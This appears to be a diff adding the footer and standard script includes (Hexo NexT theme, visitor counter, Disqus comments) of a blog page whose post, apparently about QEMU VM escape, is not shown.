+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">giantbranch</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+<div class="footer-custom">
+<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
+<br>
+这是我的新博客，网站建于2017年10月
+<!-- <br>以下UV,PV统计始于2018.06.23 -->
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://www.giantbranch.cn/2019/07/17/VM escape 之 QEMU Case Study/';
+          this.page.identifier = '2019/07/17/VM escape 之 QEMU Case Study/';
+          this.page.title = 'VM escape 之 QEMU Case Study';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://giantbranch.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
